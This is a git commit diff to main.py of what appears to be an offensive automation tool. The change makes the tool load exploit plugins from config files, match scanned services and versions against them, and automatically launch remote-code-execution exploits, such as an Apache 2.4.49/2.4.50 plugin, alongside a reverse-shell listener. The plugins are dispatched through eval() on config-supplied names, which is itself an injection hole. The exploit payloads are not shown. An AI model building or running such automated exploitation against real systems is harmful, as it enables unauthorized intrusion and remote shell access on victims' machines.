9d6b8ec752c6485a0919c6af65337decaf34c54f
blank <blank@debian>
2022-10-10 12:30:24 +0200

    Add automatic detectection of initial access plugins and automatic run on vulnerable service via config file

--- main.py
+++ main.py
@@ -5,20 +5,42 @@ import socket
 from multiprocessing import Process
 import rs_client
 import sys
+import configparser
+import os
 from plugins.initial_access import *
+import constants
+
+
+def read_plugins_configs():
+    config = configparser.ConfigParser()
+    current_dir = os.path.dirname(os.path.abspath(__file__))
+    initial_plugins_path = os.path.join(current_dir, constants.PLUGINS_DIR, constants.INITIAL_ACCESS_PLUGINS_DIR)
+    configs = dict()
+    for f in os.listdir(initial_plugins_path):
+        if f.endswith('.ini'):
+            config.read(os.path.join(initial_plugins_path, f))
+            configs[config['DEFAULT']['plugin_name']] = { 
+                'service' : config['DEFAULT']['service'],
+                'versions' : config['DEFAULT']['versions']
+            }
+
+    return configs
+
 
 def listener(listener_port, listener_address):
     sys.stdin = open(0)
     rs_client.main(listener_port, listener_address)
 
-def exploit(target_ip, target_port, local_ip, local_port):
+
+def exploit(plugin_name, target_ip, target_port, local_ip, local_port):
     try:
-        print('[+] Running exploit')
-        res = apache2_4_49_RCE.exploit(target_ip, target_port, local_ip, local_port)
+        print('[+] Running plugin {}'.format(plugin_name))
+        res = eval(plugin_name).exploit(target_ip, target_port, local_ip, local_port)
         if res is True:
             print('[+] Exploit was successful !')
     except Exception as e:
         print(e)
+
 
 def extract_ip():
     st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -32,7 +54,10 @@ def extract_ip():
         st.close()
     return IP
 
+
 if __name__ == '__main__':
+
+    configs = read_plugins_configs()
     parser = argparse.ArgumentParser()
 
     parser.add_argument('-t', '--target_ip', type=str, help='ip to target', required=True)
@@ -48,16 +73,17 @@ if __name__ == '__main__':
 
     BUFFER_SIZE = 1024 * 128
     SEPARATOR = '<sep>'
-
+    
     for i in res_recon:
         print('[+] Looking for exploits for port {}'.format(i['port']))
-        if i['product'] == 'Apache httpd' and i['version'] == '2.4.50':
-            target_port = i['port']
-            listener_process = Process(target=listener, args=(args.local_port, LOCAL_IP))
-            listener_process.start()
-            exploit_process = Process(target=exploit, args=(args.target_ip, target_port, LOCAL_IP, args.local_port))
-            exploit_process.start()
-            listener_process.join()
-            exploit_process.join()
-        else:
-            print('[-] No exploit available for this port')
+        for plugin_name, values in configs.items():
+            if i['product'] == values['service'] and i ['version'] in values['versions']:
+                target_port = i['port']
+                listener_process = Process(target=listener, args = (args.local_port, LOCAL_IP))
+                listener_process.start()
+                exploit_process = Process(target=exploit, args = (plugin_name, args.target_ip, target_port, LOCAL_IP, args.local_port))
+                exploit_process.start()
+                listener_process.join()
+                exploit_process.join()
+            else:
+                print('[-] No exploit available for this port')
